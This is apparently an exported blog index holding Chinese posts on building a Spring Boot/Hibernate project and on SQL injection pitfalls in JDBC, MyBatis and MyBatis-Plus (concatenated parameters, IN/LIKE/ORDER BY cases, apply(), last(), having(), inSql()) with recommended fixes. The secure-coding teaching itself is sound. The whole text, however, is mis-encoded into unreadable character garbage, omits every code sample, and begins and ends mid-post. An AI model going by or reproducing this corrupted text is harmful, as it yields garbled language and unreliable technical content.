@OneToManyã€@ManyToOneã€@ManyToManyã€@OneToOneï¼šç”¨äºå®šä¹‰å®ä½“ç±»ä¹‹é—´çš„å…³è”å…³ç³»ã€‚ @Tableï¼šç”¨äºæŒ‡å®šæ•°æ®åº“è¡¨çš„åç§°ã€‚ @Queryï¼šç”¨äºå®šä¹‰è‡ªå®šä¹‰çš„ JPQL æŸ¥è¯¢ã€‚ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” æ­å»ºä¸€ä¸ª SpringBoot. 3.x + Hibernate + HQLæŸ¥è¯¢çš„é¡¹ç›®Hibernate æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ å¯¹è±¡å…³ç³»æ˜ å°„ï¼ˆORMï¼‰ æ¡†æ¶ï¼Œå®ƒç”¨äºç®€åŒ– Java ç¨‹åºä¸å…³ç³»å‹æ•°æ®åº“ä¹‹é—´çš„äº¤äº’ã€‚ORM çš„æ ¸å¿ƒæ€æƒ³æ˜¯å°†æ•°æ®åº“è¡¨ä¸ Java å¯¹è±¡è¿›è¡Œæ˜ å°„ï¼Œä»è€Œè®©å¼€å‘è€…å¯ä»¥é€šè¿‡æ“ä½œ Java å¯¹è±¡æ¥å®ç°å¯¹æ•°æ®åº“çš„å¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰æ“ä½œï¼Œé¿å…äº†ç›´æ¥ç¼–å†™ç¹ççš„ SQL è¯­å¥ã€‚ä¸ªäººæ„Ÿè§‰ Hibernateå’Œ mybatis-plusçš„ç»“æ„æœ‰äº›ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä½¿ç”¨äº† ORMæ¡†æ¶ï¼Œä½†æ˜¯ hibernateæ˜æ˜¾è¦æ›´ä¸ºå¤æ‚ã€‚ é…ç½®æ–‡ä»¶ pom.xmlå’Œ application.propertiesä¸åšèµ˜è¿°ã€‚ (1) é¦–å…ˆåˆ›å»º JPAå®ä½“ç±» personï¼Œå¯¹åº”çš„æ˜¯æ•°æ®åº“ä¸­çš„ personè¡¨ï¼š (2) å…¶æ¬¡åˆ›å»ºä»“åº“æ¥å£ï¼Œåœ¨ Spring Data JPA ä¸­ï¼Œå¯ä»¥é€šè¿‡ç»§æ‰¿ JpaRepository æ¥å¿«é€Ÿåˆ›å»ºä¸€ä¸ªæ•°æ®è®¿é—®å±‚æ¥å£ã€‚ JpaRepository æ¥å£ä¸­æä¾›äº†è®¸å¤šç°æˆçš„æ•°æ®åº“æŸ¥è¯¢æ–¹æ³•ï¼Œæ¯”å¦‚ findById()æ–¹æ³•ï¼Œç­‰ç­‰ã€‚å¦‚æœæä¾›çš„æ•°æ®åº“æŸ¥è¯¢æ–¹æ³•æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œå¼€å‘å¯ä»¥è¿›è¡Œè‡ªå®šä¹‰ã€‚ ä½¿ç”¨é»˜è®¤çš„ findByUsername(String name)æ–¹æ³•ï¼Œæ•°æ®åº“æŸ¥è¯¢æ•ˆæœç›¸å½“äº å¹¶ä¸”é»˜è®¤çš„æŸ¥è¯¢æ–¹æ³•ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œå¯ä»¥é¿å… sqlæ³¨å…¥ã€‚ (3) é™¤äº†ä½¿ç”¨é»˜è®¤æä¾›çš„æŸ¥è¯¢æ–¹æ³•å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ HQLæ„é€ æŸ¥è¯¢è¯­å¥æ¥æŸ¥è¯¢æ•°æ®åº“ï¼Œåœ¨æœåŠ¡å±‚ä¸­ä½¿ç”¨ï¼š HQLï¼ˆHibernate Query Languageï¼ŒHibernate æŸ¥è¯¢è¯­è¨€ï¼‰æ˜¯ Hibernate æ¡†æ¶ä¸­æä¾›çš„ä¸€ç§æŸ¥è¯¢è¯­è¨€ï¼Œå®ƒä¸ SQL ç±»ä¼¼ï¼Œä½† HQL ä¸»è¦ç”¨äºæ“ä½œ Hibernate å®ä½“å¯¹è±¡è€Œä¸æ˜¯æ•°æ®åº“è¡¨ã€‚HQL ä½¿å¼€å‘è€…èƒ½å¤Ÿä½¿ç”¨é¢å‘å¯¹è±¡çš„è¯­æ³•è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œå®ƒæ˜¯ Hibernate æ¡†æ¶ç‰¹æœ‰çš„è¯­è¨€ï¼Œæ—¨åœ¨ç®€åŒ–æ•°æ®åº“æ“ä½œï¼Œå¹¶å‡å°‘å¯¹åº•å±‚æ•°æ®åº“è¡¨çš„ç›´æ¥ä¾èµ–ã€‚ (4) åˆ›å»ºcontrollerå±‚ï¼Œè·¯ç”±ä¸­ä½¿ç”¨æœåŠ¡å±‚æ–¹æ³•ï¼Œå¯åŠ¨é¡¹ç›®ï¼ŒæˆåŠŸè®¿é—®ï¼Œå¾—åˆ°æ•°æ®åº“å›æ˜¾æ•°æ®ï¼š HQLä¸­çš„ sqlæ³¨å…¥å‚æ•°ç›´æ¥æ‹¼æ¥ HQLæ”¯æŒè¿è¡ŒåŸç”Ÿ SQLè¯­å¥ - createNativeQuery()ï¼Œè‹¥ç›´æ¥æ‹¼æ¥å‚æ•°ä¼šé€ æˆ sqlæ³¨å…¥ï¼š HQLä¸­çš„é¢„ç¼–è¯‘ä¸ºäº†é¿å… SQLæ³¨å…¥ï¼ŒHQLç»™å‡ºäº†å‡ ç§å‚æ•°ç»‘å®šæ–¹å¼ï¼Œå³åŒç†é¢„ç¼–è¯‘çš„å ä½ç¬¦ã€‚ (1) å‘½åå‚æ•°å ä½ ä½¿ç”¨ : åé¢è·Ÿè¾“å…¥å‚æ•°çš„æ–¹å¼è¿›è¡Œå ä½ã€‚ PS: è¿™ä¸ªä¸œè¥¿å‰æ®µæ—¶é—´ äº¬ä¸œé¢è¯•çš„æ—¶å€™é¢è¯•å®˜é—®åˆ°äº†ï¼Œå½“æ—¶åªçŸ¥é“ ? è¿›è¡Œå ä½ï¼Œå®Œå…¨æ²¡å¬è¯´è¿‡å†’å·è¿™ä¸ªè¯´æ³•ï¼Œç°åœ¨çœ‹æ¥æ˜¯è®¤çŸ¥æµ…è–„äº†ã€‚ å ä½ç¬¦èµ·åˆ°ä½œç”¨ï¼Œè¿›è¡Œäº†é¢„ç¼–è¯‘ï¼š (2) ä½ç½®å‚æ•°å ä½ æ•ˆæœåŒç†ï¼Œé¢„ç¼–è¯‘ï¼Œä¸åšèµ˜è¿°ã€‚ (3) åˆ—è¡¨å ä½ (inæŸ¥è¯¢) ä½¿ç”¨åˆ—è¡¨å¯ä»¥è¿›è¡Œæ‰¹é‡æŸ¥è¯¢ï¼š åŒæ ·ä¼šè¿›è¡Œé¢„ç¼–è¯‘ï¼š "},{"title":"æµ…è°ˆJavaä¸­çš„SQLæ³¨å…¥","date":"2025-01-18T04:38:38.996Z","url":"/2025/01/18/%E6%B5%85%E8%B0%88Java%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5/","tags":[["SQLæ³¨å…¥","/tags/SQL%E6%B3%A8%E5%85%A5/"]],"categories":[["SQLæ³¨å…¥","/categories/SQL%E6%B3%A8%E5%85%A5/"]],"content":"ç¯å¢ƒJava: jdk_8u65 Mysql: 9.1.0 Mysqlå¯è§†åŒ–ï¼šDBeaver 24.3.2 JDBCJDBCï¼ˆJava Database Connectivityï¼‰ æ˜¯ä¸€ä¸ª APIï¼ˆåº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼‰ï¼Œç”¨äº Java åº”ç”¨ç¨‹åºä¸æ•°æ®åº“ä¹‹é—´çš„è¿æ¥ã€‚å®ƒæ˜¯ç›´æ¥ç”¨äºæ•°æ®åº“æ“ä½œçš„æ¥å£ï¼Œè€Œä¸æ˜¯ä»‹äºåº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´çš„ä¸­é—´å±‚ã€‚ 1ã€Statement SQLè¯­å¥æ‹¼æ¥é€ æˆSQLæ³¨å…¥ 2ã€PreparedStatement é¢„ç¼–è¯‘ä½¿ç”¨ä¸å½“é¢„ç¼–è¯‘å…ˆç¼–è¯‘ sqlè¯­å¥ï¼Œæ— è®ºåç»­ç”¨æˆ·è¾“å…¥å¦‚ä½•ï¼Œéƒ½ä½œä¸ºå­—ç¬¦ä¸²æ•°æ®å¤„ç†ï¼Œè€Œ sqlæ³¨å…¥åªé’ˆå¯¹ç¼–è¯‘çš„è¿‡ç¨‹è¿›è¡Œç ´åï¼Œæ‰€ä»¥é¢„ç¼–è¯‘å¯ä»¥é˜²å¾¡ sqlæ³¨å…¥ã€‚ å¹¶ä¸”è¿˜å‡å°‘äº† sqlè¯­å¥çš„ç¼–è¯‘æ¬¡æ•°ï¼Œæé«˜äº†æ€§èƒ½ã€‚ æ­£ç¡®çš„é¢„ç¼–è¯‘è¯­å¥å¦‚ä¸‹æ‰€ç¤ºï¼š ä½†æ˜¯é¢„ç¼–è¯‘ä½¿ç”¨ä¸å½“ä¹Ÿä¼šå‡ºç° sqlæ³¨å…¥ã€‚ (1) æœªä½¿ç”¨å ä½ç¬¦ï¼Œè€Œæ˜¯ç›´æ¥æ‹¼æ¥è™½ç„¶ä½¿ç”¨äº†é¢„ç¼–è¯‘ï¼Œä½†æ˜¯æ²¡æœ‰ä½¿ç”¨ ? è¿›è¡Œå ä½ï¼Œæ‰€ä»¥æœ¬è´¨ä¸Šè¿˜æ˜¯ç›´æ¥æ‹¼æ¥å¯¼è‡´çš„ sqlæ³¨å…¥ã€‚ (2) inè¯­å¥æŸ¥è¯¢ä½¿ç”¨ inè¯­å¥çš„åœºæ™¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚æ”¶è—åœºæ™¯ï¼Œå‹¾é€‰å¤šç¯‡æ–‡ç« ï¼ŒåŒæ—¶è¿›è¡Œæ”¶è—ï¼Œè¯·æ±‚åŒ…å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š å½“ä»æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œå› ä¸ºä¸æ¸…æ¥šç”¨æˆ·é€‰ä¸­çš„æ–‡ç« çš„æ•°é‡ï¼Œå¼€å‘å¯èƒ½ä¼šç›´æ¥ä½¿ç”¨æ‹¼æ¥çš„æ–¹å¼æ„é€ æŸ¥è¯¢è¯­å¥ï¼Œå¯¼è‡´sqlæ³¨å…¥ã€‚ ä¿®å¤ï¼š å¯ä»¥å…ˆå¯¹ç”¨æˆ·ä¼ å…¥çš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œç¡®å®šå¯¹è±¡çš„ä¸ªæ•°ï¼Œæ ¹æ®ä¸ªæ•°å¢åŠ å ä½ç¬¦ï¼Œå†ä½¿ç”¨é¢„ç¼–è¯‘ã€‚ æ¯”å¦‚ â€˜å–æ¶ˆæ”¶è—â€™çš„åœºæ™¯ï¼š (3) Likeè¯­å¥æ¨¡ç³ŠæŸ¥è¯¢æœ‰äº›ä¸šåŠ¡ä¼šä½¿ç”¨æ¨¡ç³ŠæŸ¥è¯¢ï¼Œæ¯”å¦‚æœç´¢æ¡†ç­‰åœºæ™¯ ä¿®å¤ï¼š å’Œ inè¯­å¥ç±»ä¼¼ï¼Œå…ˆå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œåˆ¤æ–­ï¼Œå†æ·»åŠ å ä½ç¬¦è¿›è¡Œé¢„ç¼–è¯‘ï¼š ä½†æ˜¯ likeçš„é¢„ç¼–è¯‘å¹¶éç™¾åˆ†ç™¾å¯é ï¼Œå¯ä»¥é€šè¿‡ç‰¹æ®Šå­—ç¬¦ % å’Œ _ æ¥å®ç°æ³¨å…¥ã€‚ æ¼”ç¤ºä»£ç ï¼š ä½¿ç”¨ % å’Œ _ ä¼šå¯¼è‡´è¿”å›æ‰€æœ‰ç»“æœï¼Œç»•è¿‡é¢„ç¼–è¯‘é˜²å¾¡ï¼Œæ‰€ä»¥è¦å¯¹ % å’Œ _ è¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚ (5) Order byæ³¨å…¥ORDER BY æ˜¯ SQL ä¸­ç”¨äºå¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºçš„å­å¥ã€‚å®ƒæŒ‰ç…§æŒ‡å®šçš„åˆ—æˆ–è¡¨è¾¾å¼å¯¹æ•°æ®è¿›è¡Œå‡åºï¼ˆASCï¼‰æˆ–é™åºï¼ˆDESCï¼‰æ’åˆ—ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒORDER BY æŒ‰å‡åºæ’åºã€‚ æ­£ç¡®çš„ order byæŸ¥è¯¢ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š å…¶ä¸­ idä¸ºåˆ—åï¼Œæ„æ€æ˜¯æŒ‰ç…§ idçš„å¤§å°è¿›è¡Œç”Ÿåºæ’åºã€‚ ä½†æ˜¯é¢„ç¼–è¯‘æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œä¼šå¼ºåˆ¶ç»™å ä½ç¬¦æ‰€ä¼ å…¥çš„æ•°æ®åŠ ä¸Š â€˜â€™ï¼Œâ€™idâ€™ä¼šè¢«è§†ä¸ºå­—ç¬¦ä¸²è€Œéåˆ—åï¼Œè¿™æ ·å°±ä¸ä¼šæŒ‰ç…§é¢„æœŸè¿›è¡Œæ’åºã€‚ æ‰€ä»¥åœ¨ä½¿ç”¨ JDBCè¿æ¥çš„å‰æä¸‹æƒ³è¦ä½¿ç”¨ order byï¼Œå°±ä¸èƒ½å†ä½¿ç”¨é¢„ç¼–è¯‘äº†ï¼Œåªèƒ½é€šè¿‡åšå¥½è¿‡æ»¤ï¼ŒåŠ WAFç­‰æ–¹å¼æ¥é˜²å¾¡ sqlæ³¨å…¥ã€‚ MybatisMyBatis æ˜¯ä¸€æ¬¾å¹¿æ³›ä½¿ç”¨çš„ Java æŒä¹…å±‚æ¡†æ¶ï¼Œå®ƒé€šè¿‡å°†æ•°æ®åº“æ“ä½œä¸ Java å¯¹è±¡è¿›è¡Œæ˜ å°„ï¼Œç®€åŒ–äº†æ•°æ®åº“æ“ä½œçš„è¿‡ç¨‹ã€‚MyBatis å…è®¸å¼€å‘è€…ç›´æ¥ç¼–å†™åŸç”Ÿ SQL æŸ¥è¯¢è¯­å¥ï¼Œå¹¶é€šè¿‡ XML æˆ–æ³¨è§£å°† SQL ä¸ Java æ–¹æ³•è¿›è¡Œæ˜ å°„ï¼Œä½¿å¾—æ•°æ®åº“æ“ä½œæ›´åŠ çµæ´»å’Œé«˜æ•ˆã€‚MyBatis æ˜¯ä¸€ä¸ª åŠè‡ªåŠ¨åŒ– çš„æ¡†æ¶ï¼Œå¼€å‘è€…éœ€è¦æ‰‹åŠ¨ç¼–å†™ SQL è¯­å¥ï¼Œä½†å®ƒæä¾›äº†æ˜ å°„åŠŸèƒ½ï¼Œä½¿å¾— SQL æŸ¥è¯¢ç»“æœå¯ä»¥ç›´æ¥æ˜ å°„ä¸º Java å¯¹è±¡ã€‚ ä¸»è¦ç»„ä»¶å’ŒåŸç†SqlSessionFactoryï¼š SqlSessionFactory æ˜¯ MyBatis çš„æ ¸å¿ƒå·¥å‚ç±»ï¼Œè´Ÿè´£åˆ›å»º SqlSession å¯¹è±¡ã€‚å®ƒä¼šæ ¹æ®å…¨å±€é…ç½®æ–‡ä»¶ï¼ˆmybatis-config.xmlï¼‰è¯»å–é…ç½®å¹¶åˆå§‹åŒ–ç›¸å…³ä¿¡æ¯ã€‚ SqlSessionï¼š SqlSession æ˜¯ MyBatis çš„æ ¸å¿ƒæ¥å£ï¼Œç”¨äºæ‰§è¡Œ SQL æŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°ã€åˆ é™¤ç­‰æ“ä½œã€‚é€šè¿‡ SqlSessionï¼Œä½ å¯ä»¥è·å–åˆ°æ˜ å°„å™¨æ¥å£çš„ä»£ç†å¯¹è±¡ï¼Œå¹¶æ‰§è¡Œç›¸åº”çš„ SQL æ“ä½œã€‚ Mapper æ¥å£ Mapper æ¥å£å®šä¹‰äº†æ•°æ®åº“æ“ä½œçš„æ–¹æ³•ï¼Œé€šå¸¸è¿™äº›æ–¹æ³•ä¸ SQL æ˜ å°„æ–‡ä»¶ä¸­çš„ SQL æ ‡ç­¾ä¸€ä¸€å¯¹åº”ã€‚Mapper æ¥å£é€šå¸¸ç”±å¼€å‘è€…ç¼–å†™ï¼Œæ–¹æ³•åä¸ XML æ˜ å°„æ–‡ä»¶ä¸­çš„ id åŒ¹é…ã€‚ æ˜ å°„å™¨ XML æ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶åŒ…å«äº† SQL è¯­å¥çš„å®šä¹‰ï¼ŒMyBatis æ ¹æ®æ–¹æ³•åç§°æŸ¥æ‰¾ç›¸åº”çš„ SQL è¯­å¥ï¼Œå¹¶å°†æŸ¥è¯¢ç»“æœæ˜ å°„æˆ Java å¯¹è±¡ã€‚ é€šè¿‡ idä¸ UserMapperæ¥å£ä¸­çš„æ–¹æ³•åè¿›è¡ŒåŒ¹é…ã€‚resultTypeæŒ‡å®šæ•°æ®åº“æŸ¥è¯¢çš„ç»“æœä¼šè¢«æ˜ å°„åˆ°å“ªä¸€ä¸ªJavaç±»ï¼Œè¿™é‡ŒæŸ¥è¯¢ç»“æœè¢«æ˜ å°„åˆ°äº† com.best.hello.entity.Userç±»ä¸­ã€‚ Mybatisçš„ä¸¤ç§ä¼ å‚æ–¹å¼${}: å°†ä¼ å…¥çš„å‚æ•°ç›´æ¥æ‹¼æ¥åˆ° sqlæŸ¥è¯¢è¯­å¥ä¸­ï¼Œä¸åšä»»ä½•çš„å¤„ç†ã€‚ #{}: å’Œé¢„ç¼–è¯‘å ä½ç¬¦å¼‚æ›²åŒå·¥ï¼Œå…ˆè¿›æ€§é¢„ç¼–è¯‘åä¼ å‚ã€‚å°†ä¼ å…¥çš„æ•°æ®éƒ½å½“ä½œå­—ç¬¦ä¸²ï¼Œå¯¹ä¼ å…¥çš„æ•°æ®éƒ½åŠ ä¸ŠåŒå¼•å· â€œâ€ã€‚ (1) ${}ç›´æ¥æ‹¼æ¥æŸäº›å¼€å‘ä½¿ç”¨ Mybatisæ¡†æ¶æ—¶ï¼Œä¼šä½¿ç”¨ ${}ä¼ å‚å¯¼è‡´ sqlæ³¨å…¥ï¼š ä¿®å¤åº”ä½¿ç”¨ #{}ï¼š (2) in, LikeæŸ¥è¯¢likeï¼ŒinæŸ¥è¯¢è¯­å¥åŒç†ï¼Œä½¿ç”¨ #{}å³å¯ã€‚ Like: in: (3) Order byæ³¨å…¥ä¸ JdbcåŒç†ï¼Œè‹¥ä½¿ç”¨ #{}ä¼šç»™ä¼ å‚åŠ ä¸ŠåŒå¼•å·ï¼Œå¯¼è‡´åˆ—åè¢«å½“ä½œå­—ç¬¦ä¸²è§£æï¼Œæ‰€ä»¥ä¸å¾—ä¸ä½¿ç”¨ ${}ï¼Œç”±æ­¤äº§ç”Ÿ sqlæ³¨å…¥ã€‚ Mapperæ¥å£ï¼š æ˜ å°„å™¨xmlæ–‡ä»¶ï¼š ä¸€ä¸ªå¾ˆå¥½çš„ä¿®å¤æ–¹æ³•æ˜¯ â€˜æ’åºæ˜ å°„â€™ï¼Œä»¥æˆ‘çš„ç†è§£ï¼Œæ˜¯ä¸€ç§ç±»ä¼¼äºç™½åå•çš„æœºåˆ¶ï¼Œä¸¥æ ¼é™åˆ¶ç”¨æˆ·è¾“å…¥ï¼š ç”¨æˆ·çš„è¾“å…¥åªèƒ½æ˜¯ â€˜idâ€™ å’Œ â€˜userâ€™ï¼Œè‹¥ä¸ºå…¶ä»–ç›´æ¥ä½¿ç”¨é»˜è®¤æ’åºï¼Œä¸å†ç›¸ä¿¡ç”¨æˆ·è¾“å…¥ã€‚ Mybatis-plusMybatis-Plusï¼ˆç®€ç§°MPï¼‰æ˜¯åŸºäºMyBatisçš„å¢å¼ºå·¥å…·ï¼Œå®ƒç®€åŒ–äº†MyBatisçš„æ“ä½œï¼Œæä¾›äº†ä¸€äº›å¸¸ç”¨çš„åŠŸèƒ½ï¼Œç›®çš„æ˜¯è®©å¼€å‘è€…åœ¨ä½¿ç”¨MyBatisæ—¶ï¼Œèƒ½å¤Ÿæ›´åŠ é«˜æ•ˆã€ä¾¿æ·åœ°è¿›è¡Œæ•°æ®åº“æ“ä½œã€‚Mybatis-Plusä¸éœ€è¦é‡å†™SQLè¯­å¥ï¼Œå°±èƒ½è‡ªåŠ¨å®Œæˆå¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰åŸºæœ¬æ“ä½œï¼Œå‡å°‘äº†å¤§é‡çš„ä»£ç é‡å¤æ€§ã€‚ ä¸ Mybatisä¸åŒï¼ŒMybatis-plusçœå»äº† Mybatisæ‰€å¿…éœ€çš„æ˜ å°„å™¨xmlæ–‡ä»¶ã€‚ ä¸ºäº†åŠ æ·±å°è±¡ï¼Œæˆ‘è‡ªå·±æ­äº†ä¸€ä¸ªä½¿ç”¨ SpringBoot + Mybatis-plusçš„ç¯å¢ƒï¼Œæ·»åŠ ä¾èµ–å’Œæ•°æ®åº“é…ç½®æ–‡ä»¶ä¸å¤šèµ˜è¿°ã€‚ Application.propertirsï¼š åˆ›å»ºå®ä½“ç±» - å¯ä»¥ç±»æ¯”ä¸º Mybatisä¸­çš„ resultTypeï¼š mapperå±‚ï¼Œç»§æ‰¿ BaseMapperï¼ŒBaseMapperä¸­å®šä¹‰å¥½äº†å¾ˆå¤šç°æˆçš„ sqlæŸ¥è¯¢è¯­å¥ï¼Œä¾›å¼€å‘å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼š serviceå±‚ï¼šeq -&gt; equalçš„æ„æ€ï¼Œå³ where username &#x3D; username(ç”¨æˆ·è¾“å…¥) Controllerå±‚ï¼š å¯åŠ¨é¡¹ç›®ï¼Œå³å¯è¿æ¥æ•°æ®åº“ï¼Œè¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼š BaseMapperä¸­æä¾›çš„æŸ¥è¯¢æ–¹æ³•éƒ½ä½¿ç”¨äº†é¢„ç¼–è¯‘æ¥é¿å… sqlæ³¨å…¥ã€‚ (1) apply()ç›´æ¥æ‹¼æ¥å¯¼è‡´ sqlæ³¨å…¥ æ‰“å°æ—¥å¿—å¦‚å›¾æ‰€ç¤ºï¼š å¦‚ä¸Šä»£ç ä½¿ç”¨ apply()æ–¹æ³•ä¼šå°† usernameç›´æ¥æ‹¼æ¥åˆ° sqlæŸ¥è¯¢è¯­å¥ä¸­ï¼Œä¸è¿›è¡Œä»»ä½•é¢„å¤„ç†ï¼Œå¯¼è‡´ sqlæ³¨å…¥ã€‚ ä¿®å¤æ–¹æ³•å¾ˆç®€å•ï¼Œapply()ä¹Ÿæœ‰é¢„ç¼–è¯‘ï¼š ä½¿ç”¨ {0} å……å½“å ä½ç¬¦ï¼Œè¿™æ ·å†™å¯ä»¥è¾¾åˆ°é¢„ç¼–è¯‘çš„æ•ˆæœï¼Œå¦‚ä¸‹å›¾æ‰“å°æ—¥å¿—æ‰€ç¤ºï¼š (2) last()ä½¿ç”¨ä¸å½“åœ¨ MyBatis-Plus ä¸­ï¼Œlast() æ–¹æ³•ç”¨äºåœ¨ SQL è¯­å¥çš„æœ«å°¾æ‹¼æ¥è‡ªå®šä¹‰çš„ SQL ç‰‡æ®µã€‚è¿™å¯¹äºåœ¨æŸ¥è¯¢ä¸­æ·»åŠ ä¸€äº›ç‰¹å®šçš„ SQL è¯­å¥éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚æ’åºã€åˆ†é¡µæˆ–å…¶ä»–ä¸€äº›è‡ªå®šä¹‰æ¡ä»¶ã€‚ ç›´æ¥å°† usernameæ‹¼æ¥åˆ° sqlè¯­å¥ä¸­ï¼Œå†å»æ‰§è¡Œï¼Œé€ æˆ sqlæ³¨å…¥ã€‚ ä¿®å¤å»ºè®®ï¼š å¯¹ç”¨æˆ·çš„è¾“å…¥æ•°æ®è¿›è¡Œè§„èŒƒå¤„ç†ï¼Œé‡‡ç”¨è¿‡æ»¤ç­‰æ“ä½œï¼Œå¹¶ä¸”åº”å°½é‡é¿å…ä½¿ç”¨ last()ã€‚ (3) exists()å’Œ notExists()ä½¿ç”¨ä¸å½“ï¼šEXISTS å’Œ NOT EXISTS å¸¸å¸¸ç”¨äºæŸ¥è¯¢ä¸­ï¼Œéœ€è¦æ ¹æ®æŸä¸ªæ¡ä»¶æ˜¯å¦å­˜åœ¨æ¥è¿‡æ»¤æ•°æ®ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™ç±»å­æŸ¥è¯¢ä¼šåµŒå¥—åœ¨ WHERE å­å¥ä¸­ï¼Œåˆ¤æ–­æŸä¸ªæ•°æ®æ˜¯å¦æ»¡è¶³ç‰¹å®šæ¡ä»¶ã€‚ ä¸šåŠ¡åœºæ™¯ï¼š æ¯”å¦‚æœ‰ä¸¤ä¸ªè¡¨ user å’Œ orderï¼Œorder è¡¨ä¸­çš„æ¯ä¸ªè®¢å•éƒ½ä¸ user è¡¨ä¸­çš„æŸä¸ªç”¨æˆ·ç›¸å…³è”ã€‚å¦‚æœä½ æƒ³æŸ¥è¯¢é‚£äº›æœ‰è®¢å•çš„ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨ EXISTS å­æŸ¥è¯¢ï¼š æœ€ç»ˆçš„æŸ¥è¯¢è¯­å¥ä¸ºï¼š è¿™ä¸ªæŸ¥è¯¢ä¼šè¿”å›é‚£äº›æœ‰è‡³å°‘ä¸€ä¸ªè®¢å•çš„ç”¨æˆ·ã€‚ notExists()åŒç†ã€‚ ä½†æ˜¯å¦‚æœç›´æ¥æ‹¼æ¥ç”¨æˆ·å¯æ§çš„è¾“å…¥å°±ä¼šé€ æˆ sqlæ³¨å…¥ï¼š ä¿®å¤å¯ä»¥ç»§ç»­é‡‡ç”¨ {index}çš„æ–¹å¼ï¼š (4) having()ä½¿ç”¨ä¸å½“having() ä¸»è¦ç”¨äºå¯¹åˆ†ç»„åçš„æ•°æ®è¿›è¡Œæ¡ä»¶è¿‡æ»¤ã€‚åœ¨ä¸€äº›éœ€è¦å¯¹èšåˆç»“æœè¿›è¡Œç­›é€‰çš„åœºæ™¯ä¸‹ï¼Œhaving() éå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œè®¡ç®—é”€å”®æ€»é¢ã€è®¢å•æ•°é‡ç­‰æŒ‡æ ‡ï¼Œå¹¶å¯¹è¿™äº›æŒ‡æ ‡è¿›è¡Œè¿‡æ»¤ã€‚ æ¯”å¦‚ï¼šæŸ¥è¯¢è®¢å•æ•°é‡å¤§äº 10 çš„ç”¨æˆ·ï¼š å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª orders è¡¨ï¼ŒåŒ…å« user_id å’Œ order_id ç­‰å­—æ®µã€‚å¦‚æœæˆ‘ä»¬æƒ³æŸ¥è¯¢è®¢å•æ•°é‡å¤§äº 10 çš„ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨ having() æ–¹æ³•ï¼š è¿™ä¸ªæŸ¥è¯¢ä¼šç”Ÿæˆå¦‚ä¸‹ SQLï¼š ä½†æ˜¯å¦‚æœç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥å°±ä¼šé€ æˆ sqlæ³¨å…¥ï¼š ç±»ä¼¼çš„å†™æ³•è¿˜æœ‰ï¼šåªä¸è¿‡ä¸Šé¢é‚£ä¸ªæ˜¯å­—ç¬¦å‹æ³¨å…¥ï¼Œä¸‹é¢è¿™ä¸ªæ˜¯æ•°å­—å‹æ³¨å…¥ç½¢äº†ã€‚ ä¾ç„¶æ˜¯ {idnex}å³å¯é¿å…æ³¨å…¥ï¼š (5) order byæ³¨å…¥orderBy(true, true, id) - å‡åº orderBy(true, false, id) - é™åº orderByAsc() - å‡åº orderByDesc() - é™åº order byæ³¨å…¥ä¸å‰é¢å‡ ç§ä¸åŒçš„æ˜¯ï¼Œorder byä¸å¯ä»¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œå› ä¸ºä¼šå¼ºåŠ ä¸Šå•å¼•å·ï¼Œæ‰€ä»¥ä¸èƒ½ä½¿ç”¨ {index}æ¥è¿›è¡Œä¿®å¤äº†ã€‚ å¦‚æœ order by ä¹‹åçš„æ•°æ®ç”¨æˆ·å¯æ§ï¼Œå°±å­˜åœ¨ sqlæ³¨å…¥çš„é£é™©ã€‚ æ—¶é—´ç›²æ³¨ï¼š (6) inSql()å’Œ notInSql()ä½¿ç”¨ä¸å½“ï¼šinsql() æ–¹æ³•ç”¨äºåœ¨ WHERE å­å¥ä¸­æ·»åŠ ä¸€ä¸ª IN å­æŸ¥è¯¢æ¡ä»¶ã€‚IN å­å¥ä¼šæ£€æŸ¥å­—æ®µçš„å€¼æ˜¯å¦å­˜åœ¨äºç”±å­æŸ¥è¯¢è¿”å›çš„ç»“æœé›†ä¸­ã€‚ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª orders è¡¨ï¼Œæƒ³æŸ¥è¯¢æ‰€æœ‰ user_id åœ¨æŸäº› order_id æŸ¥è¯¢ç»“æœä¸­çš„ç”¨æˆ·ã€‚å¯ä»¥ä½¿ç”¨ inSql() æ–¹æ³•æ¥æ„é€ è¿™ä¸ªæŸ¥è¯¢ï¼š ç”Ÿæˆçš„ SQLæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š æ€»ç»“äº†ä¸€ä¸‹ï¼ŒMybatis-pluså‡ºç°çš„ 